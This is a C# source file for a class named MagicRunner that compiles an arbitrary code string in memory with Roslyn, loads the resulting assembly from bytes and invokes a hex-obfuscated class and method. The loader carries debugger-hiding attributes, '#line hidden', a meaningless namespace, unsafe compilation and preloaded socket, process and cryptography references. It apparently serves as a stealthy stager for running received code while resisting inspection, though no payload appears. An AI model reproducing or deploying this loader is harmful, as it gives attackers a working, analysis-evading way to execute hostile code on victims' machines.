using Microsoft.CodeAnalysis;
using Microsoft.CodeAnalysis.CSharp;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;

#line hidden
namespace _.__._0x0001
{
    [DebuggerNonUserCode]
    [DebuggerStepThrough]
    public static class MagicRunner
    {
        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private const string AN = "\x4c\x69\x62\x72\x61\x72\x79\x41\x73\x73\x65\x6d\x62\x6c\x79";
        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private const string CN = "\x4c\x69\x62\x43\x6c\x61\x73\x73";
        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private const string MN = "\x4c\x69\x62\x4d\x65\x74\x68\x6f\x64";


        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private static readonly CSharpCompilationOptions _cO = new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary,
                                                                                                            nullableContextOptions: NullableContextOptions.Enable,
                                                                                                            allowUnsafe: true,
                                                                                                            optimizationLevel: OptimizationLevel.Release);
        [DebuggerBrowsable(DebuggerBrowsableState.Never)]
        private static readonly CSharpParseOptions _pO = new CSharpParseOptions(LanguageVersion.CSharp12,
                                                                                          DocumentationMode.None,
                                                                                          SourceCodeKind.Regular);

        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining)]
        private static PortableExecutableReference[]? DR() => [MetadataReference.CreateFromFile(typeof(object).Assembly.Location),
            MetadataReference.CreateFromFile(typeof(Console).Assembly.Location),
            MetadataReference.CreateFromFile(typeof(System.Runtime.AssemblyTargetedPatchBandAttribute).Assembly.Location),
        ];

        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining)]
        private static PortableExecutableReference[]? CR()
        {
            var r = DR()?.ToList();
            r?.AddRange([
                MetadataReference.CreateFromFile(typeof(System.Net.Sockets.Socket).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Net.Sockets.AddressFamily).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(System.Xml.Linq.XElement).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Environment).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(Process).Assembly.Location),
                MetadataReference.CreateFromFile(typeof(MemoryStream).Assembly.Location),
                MetadataReference.CreateFromFile(Assembly.Load("System").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Runtime").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.IO").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Net").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Xml.Linq").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Linq").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Collections.NonGeneric").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.ComponentModel.Primitives").Location),
                MetadataReference.CreateFromFile(Assembly.Load("System.Security.Cryptography").Location)]);
            return [.. r];
        }

        [DebuggerStepThrough]
        [DebuggerHidden]
        [MethodImpl(MethodImplOptions.NoInlining)]
        public static string MagicTime(string i)
        {
            try
            {
                var sT = SyntaxFactory.ParseSyntaxTree(i, _pO);
                var c = CSharpCompilation.Create(AN, [sT], CR(), _cO);

                using var ms = new MemoryStream();
                var eR = c.Emit(ms);

                if (!eR.Success)
                {
                    var sb = new StringBuilder();
                    // Handle compilation errors
                    foreach (var diagnostic in eR.Diagnostics)
                        sb.AppendLine(diagnostic.ToString());
                    return sb.ToString();
                }
                else
                {
                    ms.Seek(0, SeekOrigin.Begin);

                    // Load the compiled assembly
                    var a = Assembly.Load(ms.ToArray());

                    // Execute the library code
                    var lCT = a.GetType(CN);
                    if (lCT != null)
                    {
                        var lI = Activator.CreateInstance(lCT);
                        var lM = lCT.GetMethod(MN);
                        lM?.Invoke(lI, null);
                    }
                    return string.Empty;
                }
            }
            catch
            {
                throw;
            }
        }
    }
}
#line default